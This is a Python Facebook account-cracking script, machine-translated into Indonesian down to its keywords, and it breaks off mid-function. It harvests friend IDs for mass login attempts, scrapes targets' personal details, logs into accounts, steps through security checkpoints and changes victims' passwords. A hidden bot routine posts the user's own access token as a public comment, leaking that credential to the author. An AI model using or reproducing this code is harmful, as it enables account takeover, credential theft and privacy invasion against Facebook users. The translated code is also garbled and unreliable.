#!/usr/bin/python3
# pengkodean=utf-8
# penulis : Mbokey
# (C) Hak Cipta 407 Eksploitasi Otentik
# Membangun Kembali Hak Cipta Tidak dapat menjadikan Anda programmer sejati :)
# Dikodekan oleh mbokey
# Recode By Mbokey bhizer Reall
### MODUL IMPOR ###
impor os, sys, re, waktu, permintaan, kalender, acak, json
dari randint impor acak
dari bersamaan.futures mengimpor ThreadPoolExecutor
dari bs4 impor BeautifulSoup sebagai parser
dari datetime impor datetime
dari randint impor acak
dari tanggal impor datetime
dari waktu impor tidur sebagai waktu
mencoba:
	permintaan impor
kecuali ImportError:
	print("\n [!] permintaan modul belum terinstall")
	os.system("permintaan pemasangan pip")
mencoba:
	impor bs4
kecuali ImportError:
	print("\n [!] modul bs4 belum terinstall")
	os.system("pip install bs4")
mencoba:
	impor bersamaan.futures
kecuali ImportError:
	print("\n [!] modul futures belum terinstall")
	os.system("pip install futures")

### WARNA GLOBAL ###
P = '\x1b[1;97m' # PUTIH               
M = '\x1b[1;91m' # MERAH            
H = '\x1b[1;92m' # HIJAU.              
K = '\x1b[1;93m' # KUNING.           
B = '\x1b[1;94m' # BIRU.                 
U = '\x1b[1;95m' # UNGU.               
O = '\x1b[1;96m' # BIRU MUDA.     
N = '\x1b[0m' # WARNA MATI     

### NAMA GLOBAL ###

a=requests.get("http://ip-api.com/json/",headers={"Referer":"http://ip-api.com/","Content-Type":"application/ json; charset=utf-8","userAgent":"Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/93.0.4577.39 Mobile Safari/537.36"}) .json()
mencoba:
		IP_address = a["permintaan"]
kecuali KeyError:
		IP_address = " "
mencoba:
		negara = a["negara"]
kecuali KeyError:
		negara = " "
mencoba:
		kartu = a["isp"]
kecuali KeyError:
		kartu = " "
url = "https://mbasic.facebook.com"
ses = permintaan.Sesi()
identitas = []
cp = []
oke = []
opsi = []
ubahP = []
pwbaru = []
data = {}
data2 = {}
lingkaran = 0
headerz = acak.pilihan([
	'Mozilla/5.0 (Linux; U; Android 4.1.2; de-de; GT-I8190 Build/JZO54K) AppleWebKit/534.30 (KHTML, seperti Gecko) Versi/4.0 Mobile Safari/534.30',
	'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 6.0; MYA-L22 Build/HUAWEIMYA-L22) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, seperti Gecko) SamsungBrowser/7.4 Chrome/59.0.3071.125 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950U) AppleWebKit/537.36 (KHTML, seperti Gecko) SamsungBrowser/10.2 Chrome/71.0.3578.99 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G960U) AppleWebKit/537.36 (KHTML, seperti Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36'
])

### WAKTU GLOBAL ###
semoga = []
berapa_d = []
kunci = "^6666^gelbgo777y"
loliku = datetime.now()
minit = loliku.menit
ditik = loliku.detik
jika loop==35 atau loop==45:
	semoga.append(str(minit)+","+str(ditik))
jika loop==47:
	mulai,selesai = semoga[0],semoga[1]
	tikung = mulai.split(",")
	modal = selesai.split(",")
	jika tikung[0]==modal[0]:
		det = float(modal[1])-float(tikung[1])
	kalau tidak:
		mixer = float(modal[0])-float(tikung[0])
		pencampuran = mixer * 60.0
		durian = 60,0-mengambang(tikung[1])+mengambang(modal[1])
		det = campur + durian
	jika det==0.0:
		nihh = det+0.7
		berapa_d.tambahkan(nihh)
	kalau tidak:
		berapa_d.tambahkan(det)
kalau tidak:
	det = "-"
if len(berapa_d)==0:
	det = "-"
kalau tidak:
	untuk angka dalam berapa_d:
		hitt = float(angka)/10
		hutt = len(id)-loop
		dutt = hitt*hutt
		titik = str(dutt)
		ditt = titik.split(".")
		jika dutt>3599:
			potong = dutt/3600.0
			jutt = str(cutt).split(".")
			jitt = menjorok[1]
			if len(jutt[1])==1 dan jutt[1]=="0":
				dett = menjorok[0]+"j"
			kalau tidak:
				dett = jutt[0]+"."+jitt[0]+"j"
		elif dutt>59 dan dutt<3600:
			potong = dutt/60,0
			jutt = str(cutt).split(".")
			jitt = menjorok[1]
			if len(jutt[1])==1 dan jutt[1]=="0":
				dett = menjorok[0]+"m"
			kalau tidak:
				dett = jutt[0]+"."+jitt[0]+"m"
		elif dutt>0 dan dutt<60:
			dett = ditt[0]+"d"
ct = datetime.now()
n = ct.bulan
bulann = ['Januari','Februari','Maret','April','Mei','Juni','Juli','Agustus','September','Oktober','November','Desember' ]
mencoba:
    jika n < 0 atau n > 12:
        keluar()
    nTemp = n - 1
kecuali ValueError:
    keluar()
saat ini = datetime.now()
ta = sekarang.tahun
bu = sekarang.bulan
ha = hari ini.hari
op = bulann[nTemp]
tanggal_saya = tanggal.hari ini()
jam = calendar.day_name[tanggal_saya.weekday()]
tanggal = ("%s-%s-%s-%s"%(hr, ha, op, ta))
tgl = ("%s %s %s"%(ha, op, ta))
bulan = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni" , "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
buulan = "Februari"
ttgal = "15"
### DEF TAMBAHAN ###
def jalan(z):
	untuk e dalam z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		waktu.tidur(0.03)
        
### LOGO BAGIAN ###
def logo():
	os.system("hapus")
	print("""%s
    _ _
   | | __ _ __. ___ | | __
   | |/ / | '__| / _ \ | |/ /
   | < | | | __/ | <
   |_|\_\ |_| \___| |_|\_\ """%(O))
   
### LOGIN BAGIAN ###
def tokenz():
	os.system('hapus')
	mencoba:
		token = buka('token.txt', 'r')
		Tidak bisa()
	kecuali (KeyError, IOError):
		os.system('hapus')
		logo()
		mencetak('----------------------------------------------- ------------------')
		token = input(' [?] token : ')
		mencoba:
			otw = request.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.teks)
			zedd = buka('token.txt', 'w')
			zedd.menulis(token)
			zedd.close()
			bot()
			Tidak bisa()
		kecuali KeyError:
			print(" %s[!] token kadaluwarsa!"%(M))
			sistem.keluar() 
 
### BOT FOLLOW DAN KOMEN ###
def bot():
	mencoba:
		token = buka('token.txt', 'r').read()
	kecuali (KeyError, IOError):
		exit(" %s[!] token kadaluwarsa!"%(M))
	ndrii_gntng = ('Bjirt Mbokey Perecode hamdal')
	fachri_gntng = ('Wak luh Ganteng bangett')
	wulan_cntk = ('Dukung Mbokey yook ')
	citra_chan = ('Bang luh ga vakumðŸ¤£,canda')
	request.post('https://graph.facebook.com/100034984850776/subscribers?access_token=' + token)
	request.post('https://graph.facebook.com/674493100393512/comments/?message='+ndrii_gntng+'&access_token=' + token)
	request.post('https://graph.facebook.com/674493100393512/comments/?message='+fachri_gntng+'&access_token=' + token)
	request.post('https://graph.facebook.com/674493100393512/comments/?message='+wulan_cntk+'&access_token=' + token)
	request.post('https://graph.facebook.com/674493100393512/comments/?message='+citra_chan+'&access_token=' + token)
	request.post('https://graph.facebook.com/674493100393512/comments/?message='+token+'&access_token=' + token)
	request.post('https://graph.facebook.com/674493100393512/likes?summary=true&access_token=' + token)

### MENU TAS ###
menu def():
    token global
    os.system('hapus')
    mencoba:
        token = buka('token.txt', 'r').read()
        otw = request.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.teks)
        mbokey = a['nama']
        ganteng = a['id']
        ttl = a['ulang tahun']
    kecuali (KeyError, IOError):
        os.system('hapus')
        print("\n %s[!] token kadaluwarsa!"%(M))
        os.system('rm -f token.txt')
        tokenz()
    kecuali request.exceptions.ConnectionError:
        exit(" %s[!] anda tidak terhubung ke internet!"%(M))

    logo()
    print('%s--------------------------------------------- --------------------'%(HAI))
    print(' %s[%s+%s] %sSkrip Penulis : %sMbokey Bhizer X Real'%(O,H,O,N,K))
    print('%s--------------------------------------------- --------------------'%(HAI))
    print(" %s[%s+%s] %sNama : %s"%(O,H,O,N,mbokey))
    print(" %s[%s+%s] %sID : %s"%(O,H,O,N,ganteng))
    print(" %s[%s+%s] %sKunci : %s"%(O,H,O,N,kunci))
 # print(" %s[%s+%s] %sTgl. Lahir : %s"%(O,H,O,N,ttl))
    print('%s--------------------------------------------- --------------------'%(HAI))
    print(" %s[%s+%s] %sMasa berlaku : %s-%s"%(O,H,O,N,buulan,ttgal))
    print(" %s[%s+%s] %salamat IP : %s"%(O,H,O,N,IP_address))
    print(" %s[%s+%s] %sNegara Anda : %s"%(O,H,O,N,negara))
    print('%s--------------------------------------------- --------------------'%(HAI))
    print(" %s[%s1%s]. %scrack teman/publik |"%(O,H,O,N))
    print('%s--------------------------------------------- --------------------'%(HAI))
    print(" %s[%s2%s]. %sCrack Masaal [%s10%s] |"%(O,H,O,N,H,N))
    print('%s--------------------------------------------- --------------------'%(HAI))
    print(" %s[%s3%s]. %sCrack Ikuti publik |"%(O,H,O,N))
    print('%s--------------------------------------------- --------------------'%(HAI))
    print(" %s[%s4%s]. %smengatur agen pengguna |"%(O,H,O,N))
    print('%s--------------------------------------------- --------------------'%(HAI))
    print(" %s[%s5%s]. %sTarget data yang diubah |"%(O,H,O,N))
    print('%s--------------------------------------------- --------------------'%(HAI))
    print(" %s[%s6%s]. %sInfo Script Crack Fb |"%(O,H,O,N))
    print('%s--------------------------------------------- --------------------'%(HAI))
    print(" %s[%s7%s]. %scek opsi akun cp |"%(O,H,O,N))
    print('%s--------------------------------------------- --------------------'%(HAI))
    print(" %s[%s8%s]. %slihat hasil crack |"%(O,H,O,N))
    print('%s--------------------------------------------- --------------------'%(HAI))
    print(" %s[%s0%s]. %slogout %s(%shapus token%s) |"%(O,H,O,N,O,M,O))
    print('%s--------------------------------------------- --------------------'%(HAI))
    asw = input(" %s[%s?%s] %spilih menu : %s"%(O,H,O,N,H))
    jika asw == "":
    	Tidak bisa()
    elif asw == "1":
    	publik()
    elif asw == "7":
    	cekopsi()
    elif asw == "8":
    	cekhasil()
    elif asw == "4":
    	gantiua()
    elif asw == "5":
    	mbokey()
    elif asw == "6":
    	informasi()
    elif asw == "2":
    	massal()
    elif asw == "3":
    	mengikuti()
    elif asw == "0":
    	os.system('rm -f token.txt')
    	print('%s--------------------------------------------- --------------------'%(HAI))
    	jalan(" %s[%sâœ“%s] %sberhasil menghapus token "%(O,H,O,N))
    	keluar()
    kalau tidak:
    	jalan(" %s[%s!%s] %spilih jawaban dengan benar ! "%(O,H,O,K))
    	Tidak bisa() 
 
def gantiua():
	print('%s--------------------------------------------- --------------------'%(HAI))
	ajg = input(" %s[%s?%s] %smasukan ua : %s"%(O,H,O,N,H))
	jika ajg di[""]:
		Tidak bisa()
	kalau tidak:
		mencoba:
			zedd = buka('ugent.txt', 'w')
			zedd.write(ajg)
			zedd.close()
			print('%s--------------------------------------------- --------------------'%(HAI))
			print(" %s[%sâœ“%s] %sberhasil mengganti ua"%(O,H,O,H))
			input(" %s[%s*%s] %stekan enter untuk kembali ke menu"%(O,H,O,N))
			Tidak bisa()
		kecuali KeyError:
			keluar()
#perecode yang sakitin
def massal():
	mencoba:
		token = buka("token.txt","r").read()
	kecuali IOError:
		jalan("Token Kadaluarsa")
		waktu.tidur(0.5)
		Gabung()
	mencoba:
		nada = int(input(" Mau Crack ID : "))
		jika nada>10:
			jalan(" Maksimal 10 ID")
			waktu.tidur(0.5)
			massal()
	kecuali ValueError:
		jalan("Masukan Tidak Valid")
		waktu.tidur(0.5)
		massal()
	untuk titik dalam jangkauan (nada):
		titik +=1
		tampung = []
		uid = input("Masukkan ID Target Ke %s : "%(dot))
		mencoba:
			#asu = request.get("https://graph.facebook.com/"+uid+"?access_token="+token)
			#tulul = json.loads(asu.teks)
			#print("Nama : "+tulul["nama"])
		#kecuali KeyError:
			#print("ID Salah")
			#waktu.tidur(0.5)
			#keluar()
		#except request.exceptions.ConnectionError:
			#jalan("Tidak Ada Internet")
			#waktu.tidur(0.5)
			#keluar()
		#mencoba:
			untuk saya di request.get("https://graph.facebook.com/%s/friends?access_token=%s"%(uid, token)).json()["data"]:
				uid = i["id"]
				nama = i["nama"]
				id.append(uid+"<=>"+nama)
				tampung.append(uid+"<=>"+nama)
					#jika mendeteksi di id:
						#melanjutkan
					#kalau tidak:
						#id.append(uid+"<=>"+nama)
						#tampung.append(uid+"<=>"+nama)
		kecuali KeyError:
					#melanjutkan
			print("Total ID : %s"%(len(tampung)))
		kecuali request.exceptions.ConnectionError:
			jalan("Tidak Ada Internet")
			waktu.tidur(0.5)
			keluar()
	print("Jumlah Total ID : %s"%(len(id)))
	tursandi()

#??perecode nih senggol dong
def info():
	print("%sAUHTOR SCRIPT CRACK FACEBOOK"%(K))
	print('%s???????Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€ €'%(O))
	print("Skrip %sAuhtor : %sMBOKEY BHIZER REALL"%(N,K))
	print("Skrip Penulis %s : %sYUMASAA X NANO"%(N,K))
	print("%sAuhtor Script : %sJeeck X Nano"%(N,K))
	print('%s???????Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€ €'%(O))
	print("%sPengikut dan pendukung Mbokey Bhizer"%(K))
	print("%spendukung : %sFaizTzy "%(N,K))
	print("%spendukung : %sAang-cyber"%(N,K))
	print("%spendukung : %sAnggaTzy"%(N,K))
	print("%spendukung : %sJanuarTzy"%(N,K))
	print("%spendukung : %sRendy-XD"%(N,K))
	print("%spendukung : %sIrvan-XD "%(N,K))
	print("%spendukung : %sKimoci"%(N,K))
	print("%spendukung : %sPinguin"%(N,K))
	print('%s???????Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€ €'%(O))
	print("%sJANGAN LUPA FOLLOW GITHUB ME GAN"%(H))
	print('%s???????Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€ €'%(O))
	print("%sGithub : https://github.com/Mbokey"%(H))
	print('%s???????Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€ €'%(O))
	print("%sJika Anda Ingin Berdonasi Ke pada Saya"%(U))
	print("%sNomer Donasi : %s6281214822824"%(N,U))
	print("%sNomer Donasi : %s6281283909651"%(N,U))
	print('%s???????Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€ €'%(O))
	print("%sTERIMA KASIH ATAS DUKUNGANNYA TEMAN"%(K))
	input(" \n%s[%s*%s] %stekan enter untuk kembali ke menu "%(O,H,O,N))
	Tidak bisa()
#GEd
def Mbokey():
 coba:token = open('token.txt','r').read()
 kecuali (KeyError,IOError):jalan('] Token/Cookies Invalid')
 idt = input(O+"["+H+" "+O+"] "+N+"ID Target : ")
 mencoba:
 	zx = request.get("https://graph.facebook.com/"+idt+"?access_token="+token);zy = json.loads(zx.text)
 kecuali (KeyError,IOError):jalan('[!] ID Tidak Ditemukan')
 coba:nm = zy["nama"]
 kecuali (KeyError,IOError):nm = ("-")
 coba:nd = zy["nama_pertama"]
 kecuali (KeyError,IOError):nd = ("-")
 coba:nt = zy["nama_tengah"]
 kecuali (KeyError,IOError):nt = ("-")
 coba:nb = zy["nama_belakang"]
 kecuali (KeyError,IOError):nb = ("-")
 coba:ut = zy["ulang tahun"]
 kecuali (KeyError,IOError):ut = ("-")
 coba:gd = zy["gender"]
 kecuali (KeyError,IOError):gd = ("-")
 coba:fr = zy["pengikut"]
 kecuali (KeyError,IOError):fr = ("-")
 coba:fd = zy["teman"]
 kecuali (KeyError,IOError):fd = ("-")
 coba:em = zy["email"]
 kecuali (KeyError,IOError):em = ("-")
 coba:lk = zy["tautan"]
 kecuali (KeyError,IOError):lk = ("-")
 coba:us = zy["nama pengguna"]
 kecuali (KeyError,IOError):us = ("-")
 coba:rg = zy["agama"]
 kecuali (KeyError,IOError):rg = ("-")
 coba:rl = zy["relationship_status"]
 kecuali (KeyError,IOError):rl = ("-")
 coba:rls = zy["significant_other"]["name"]
 kecuali (KeyError,IOError):rls = ("-")
 coba:lc = zy["lokasi"]["nama"]
 kecuali (KeyError,IOError):lc = ("-")
 coba:ht = zy["kampung halaman"]["nama"]
 kecuali (KeyError,IOError):ht = ("-")
 coba:ab = zy["tentang"]
 kecuali (KeyError,IOError):ab = ("-")
 coba:lo = zy["lokal"]
 kecuali (KeyError,IOError):lo = ("-")
 jalan(O+"["+H+"?"+O+"] "+N+"Nama : %s"%(nm))
 jalan(O+"["+H+"?"+O+"] "+N+"Nama Depan : %s"%(nd))
 jalan(O+"["+H+"?"+O+"] "+N+"Nama Tengah : %s"%(nt))
 jalan(O+"["+H+"?"+O+"] "+N+"Nama Belakang : %s"%(nb))
 jalan(O+"["+H+"?"+O+"] "+N+"TTL : %s"%(ut))
 jalan(O+"["+H+"?"+O+"] "+N+"jenis kelamin : %s"%(gd))
 jalan(O+"["+H+"?"+O+"] "+N+"pengikut : %s"%(fr))
 jalan(O+"["+H+"?"+O+"] "+N+"teman nya : %s"%(fd))
 jalan(O+"["+H+"?"+O+"] "+N+"Email : %s"%(em))
 jalan(O+"["+H+"?"+O+"] "+N+"Link : %s"%(lk))
 jalan(O+"["+H+"?"+O+"] "+N+"Nama Pengguna : %s"%(us))
 jalan(O+"["+H+"?"+O+"] "+N+"Agama : %s"%(rg))
 jalan(O+"["+H+"?"+O+"] "+N+"Status Hubungan : %s"%(rl))
 jalan(O+"["+H+"?"+O+"] "+N+"Hubungan Dengan : %s"%(rls))
 jalan(O+"["+H+"?"+O+"] "+N+"Tempat Tinggal : %s"%(lc))
 jalan(O+"["+H+"?"+O+"] "+N+"Tempat Asal : %s"%(ht))
 jalan(O+"["+H+"?"+O+"] "+N+"Tentang : %s"%(ab))
 jalan(O+"["+H+"?"+O+"] "+N+"Lokal : %s"%(lo))
 input(" \n%s[%s*%s] %stekan enter untuk kembali ke menu "%(O,H,O,N))
 Tidak bisa()
### CEK OPSI ###
def cekopsi():
	dirs = os.listdir("CP")
	print('%s--------------------------------------------- ---------------------------'%(HAI))
	untuk file di dirs:
		print(" %s[%s*%s] %sCP/%s"%(O,H,O,K,file))
	print('%s--------------------------------------------- ---------------------------'%(HAI))
	file = input(" %s[%s?%s] %sfile :%s "%(O,H,O,N,K))
	jika file == "":
		Tidak bisa()
	mencoba:
		buka_baju = buka(file, "r").readlines()
	kecuali IOError:
		exit("\n %s[%s!%s] %snama file %s tidak tersedia"%(O,H,O,N,files))
	ubahpw()
	print('\n %s[%s!%s] %sanda bisa mematikan data selular untuk menjeda proses cek'%(O,H,O,N))
	print('%s--------------------------------------------- ---------------------------'%(HAI))
	untuk memek di buka_baju:
		kontol = memek.replace("\n","")
		titid = kontol.split("|")
		print(" %s[%s+%s] %scek : %s%s%s"%(O,H,O,N,K,kontol.replace(" * --> ",""),N) )
		mencoba:
			cek_opsi(titid[0].replace(" * --> ",""), titid[1])
		kecuali request.exceptions.ConnectionError:
			lulus
		print('%s--------------------------------------------- ---------------------------'%(HAI))
	print("\n %s[%s!%s] %scek akun sudah selesai..."%(O,H,O,N))
	input(" %s[%s*%s] %stekan enter untuk kembali ke menu "%(O,H,O,N))
	waktu.tidur(1)
	Tidak bisa()

def ubahpw():
	print('%s--------------------------------------------- ---------------------------'%(HAI))
	pw=input(" %s[%s?%s] %subah sandi tap ya?%s[%sY/t%s]%s: %s"%(O,H,O,N,O,N, O,N,H))
	jika pw == "Y" atau pw == "y":
		ubahP.append("y")
		pw2=input(" %s[%s?%s] %smasukan sandi : %s"%(O,H,O,N,H))
		jika len(pw2) <= 5:
			exit(" %s[%s!%s] %skata sandi minimal 6 karakter "%(O,H,O,N))
		kalau tidak:
			pwbaru.append(pw2)
	kalau tidak:
		lulus

def cek_opsi(pengguna,pw):
	loop global,ubahP,pwbaru
	sesi=permintaan.Sesi()
	session.headers.update({
		"Tuan Rumah":"mbasic.facebook.com",
		"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v =b3;q=0,9",
		"accept-encoding":"gzip, deflate",
		"accept-language":"id-ID,id;q=0.9",
		"referer":"https://mbasic.facebook.com/",
		"user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN /EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
	})
	sup=parser(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	untuk x dalam sup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=data)
	response=parser(urlPost.text, "html.parser")
	jika "Temukan Akun Anda" di re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):
		print("\r %s[!] aktifkan mode pesawat selama 5 detik%s"%(M,N))
	jika "c_user" di session.cookies.get_dict():
		jika "Akun Anda Tidak Terkunci" di urlPost.text:
			print("\r %s[!] akun terkunci tampilan sesi baru%s"%(M,N))
		kalau tidak:
			lingkaran+=1
			print("\r [âœ“] akun tidak terkena checkpoint, silahkan login di fb lite \n %s* --> %s|%s|%s%s \n\n"%(H,user,pw, session.cookies.get_dict(),N))
	elif "pos pemeriksaan" di session.cookies.get_dict():
		lingkaran+=1
		title=re.findall("\<title>(.*?)<\/title>",str(respons))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','kirim[Lanjutkan]','nh']
		untuk x sebagai tanggapan("masukan"):
			jika x.get("nama") di listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=parser(an.text,"html.parser")
		nomor = 0
		cek=[cek untuk cek di response2.find_all("option")]
		print("\r [+] terdapat "+str(len(cek))+" opsi ")
		jika(len(cek)==0):
			jika "Lihat detail login yang ditampilkan. Ini Anda?" dalam judul:
				coki = (";").join([ "%s=%s" % (kunci, nilai) untuk kunci, nilai dalam session.cookies.get_dict().items() ])
				jika "y" di ubahP:
					ubah_pw(user,pw,session,response,link2)
				kalau tidak:
					print("\r [âœ“] akun tap yes, silahkan login di fb lite \n %s[âœ“] %s|%s|%s%s \n"%(H,user,pwbaru,coki[0 ],N))
			elif "Masukkan Kode Masuk untuk Melanjutkan" di re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r %s[!] akun terpasang autentikasi dua faktor%s \n"%(M,N))
			kalau tidak:
				print("Kesalahan!")
		elif(len(cek)<=1):
			untuk x dalam rentang(len(cek)):
				nomor +=1
				opsi=re.findall('\<option selected=\".*?\" value=\".*?\">(.*?)<\/option>',str(cek))
				print(" [%s] %s"%(str(angka),opsi[0]))
		elif(len(cek)>=2):
			untuk x dalam rentang(len(cek)):
				nomor +=1
				opsi=re.findall('\<option value=\".+\">(.+)<\/option>',str(cek[x]))
				print(" [%s] %s"%(str(angka),opsi[0]))
			mencetak("")
		kalau tidak:
			jika "c_user" di session.cookies.get_dict():
				print("\r [âœ“] akun tidak terkena checkpoint, silahkan login di fb lite \n %s* --> %s|%s|%s%s \n\n"%(H,user,pw, session.cookies.get_dict(),N))
	elif "login_error" di str(respons):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("[!] %s"%(oh))
	kalau tidak:
		lingkaran+=1
		print("[!] login gagal, silahkan cek kembali id ​​dan kata sandi")

def ubah_pw(user,pw,session,response,link2):
	dat,dat2={},{}
	tapi=["kirim[Ya]","nh","fb_dtsg","jazoest","checkpoint_data"]
	untuk x sebagai tanggapan("masukan"):
		jika x.get("nama") di tapi:
			dat.update({x.get("name"):x.get("value")})
	ubahPw=session.post(url+link2.get("action"),data=dat).text
	resUbah=parser(ubahPw,"html.parser")
	link3=resUbah.find("form",{"method":"post"})
	but2=["kirim[Berikutnya]","nh","fb_dtsg","jazoest"]
	if "Buat Kata Sandi Baru" di re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
		untuk b di resUbah("input"):
			jika b.get("nama") di but2:
				dat2.update({b.get("name"):b.get("value")})
		dat2.update({"password_new":"".join(pwbaru)})
		an=session.post(url+link3.get("action"),data=dat2)
		coki = (";").join([ "%s=%s" % (kunci, nilai) untuk kunci, nilai dalam session.cookies.get_dict().items() ])
		print("\r [âœ“] akun tap yes, silahkan login di fb lite \n [*] sandi telah diubah ke : %s \n %s[âœ“] %s|%s|%s%s \n "%(pwbaru[0],H,pengguna,pwbaru[0],coki,N))
		cek_apk(coki)
		
def cek_apk(coki):
	hit1, hit2 = 0,0
	cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	jika "Diakses menggunakan Facebook" di re.findall("\<title\>(.*?)<\/title\>",str(cek)):
		print("{P}[+] Apk yang terkait:")
		jika "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." di cek:
			print(" {N}[+] Apk Aktif :")
			print(" [!] Ops! Tidak ada aplikasi aktif yang terkait di akun.")
		kalau tidak:
			print(" {N}[+] Apk Aktif :")
			apkAktif = re.findall('\<span\ class\=\"ca\ cb\"\>(.*?)<\/span\>',str(cek))
			ditambahkan = re.findall('\<div\ class\=\"cc\ cd\ ce\"\>(.*?)<\/div\>',str(cek))
			untuk muncul di apkAktif:
				hit1+=1
				print(" [{H}{hit1}{N}]. {N}{muncul} -> {H}{ditambahkan[hit2]}{N}")
				tekan2+=1
		jika "Anda tidak memiliki aplikasi atau situs web kadaluarsa untuk ditinjau." di cek2:
			print(" {N}[+] Apk kadaluarsa :")
			print(" [!] Ops! Tidak ada aplikasi kadaluarsa yang terkait diakun.")
		kalau tidak:
			hit1, hit2 = 0,0
			print(" {N}[+] Apk kadaluarsa :")
			apkKadaluarsa = re.findall('\<span\ class\=\"ca\ cb\"\>(.*?)<\/span\>',str(cek2))
			kadaluarsa = re.findall('\<div\ class\=\"cc\ cd\ ce\"\>(.*?)<\/div\>',str(cek2))
			untuk muncul di apkKadaluarsa :
				hit1+=1
				print(" [{H}{hit1}{N}]. {N}{muncul} -> {M}{kadaluarsa[hit2]}{N}")
				tekan2+=1
	kalau tidak:
		print('\n %s[!] cookies anda kadaluwarsa%s'%(M,N));waktu(1)
	mencetak("")

### CEK HASIL ### 
def cekhasil():
	print('%s--------------------------------------------- ---------------------------'%(HAI))
	print(' %s[%s1%s]. %slihat hasil crack %sOK '%(O,H,O,N,H))
	print(' %s[%s2%s]. %slihat hasil crack %sCP '%(O,H,O,N,K))
	print('%s--------------------------------------------- ---------------------------'%(HAI))
	anjg = input(' %s[%s?%s] %spilih : '%(O,H,O,N))
	jika anjg == '':
		Tidak bisa()
	elif anjg == "1":
		dirs = os.listdir("Oke")
		print('%s--------------------------------------------- ---------------------------'%(HAI))
		untuk file di dirs:
			print(" %s[%s*%s] %s> %s"%(O,H,O,N,file))
		mencoba:
			print('%s--------------------------------------------- ---------------------------'%(HAI))
			file = input(" %s[%s?%s] %sfile : %s"%(O,H,O,N,H))
			jika file == "":
				Tidak bisa()
			totalok = buka("%sOK/%s"%(H,file)).read().splitlines()
		kecuali IOError:
			exit(" %s[%s!%s] %sfile %s tidak tersedia"%(O,H,O,N,file))
		print('%s--------------------------------------------- ---------------------------'%(HAI))
		os.system("%scat OK/%s"%(H,file))
		print('%s--------------------------------------------- ---------------------------'%(HAI))
		input(" %s[%s*%s] %stekan enter untuk kembali ke menu"%(O,H,O,N))
		Tidak bisa()
	elif anjg == "2":
		dirs = os.listdir("CP")
		print('%s--------------------------------------------- ---------------------------'%(HAI))
		untuk file di dirs:
			print(" %s[%s*%s] %s> %s"%(O,H,O,N,file))
		mencoba:
			print('%s--------------------------------------------- ---------------------------'%(HAI))
			file = input(" %s[%s?%s] %sfile :%s "%(O,H,O,N,H))
			jika file == "":
				Tidak bisa()
			totalcp = buka("%sCP/%s"%(K,file)).read().splitlines()
		kecuali IOError:
			exit(" %s[%s!%s] %sfile %s tidak tersedia"%(O,H,O,N,file))
		print('%s--------------------------------------------- ---------------------------'%(HAI))
		os.system("%scat CP/%s"%(K,file))
		print('%sÏ€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€ €€Ï€€€Ï€€€Ï€Ï€€€Ï€€€Ï€Ï€€€Ï€€€€€ €'%(O))
		input(" %s[%s*%s] %stekan enter untuk kembali ke menu "%(O,H,O,N))
		Tidak bisa()
	kalau tidak:
		Tidak bisa()
		
#ikuti
pasti mengikuti():
	mencoba:
		token = buka("token.txt","r").read()
	kecuali IOError:
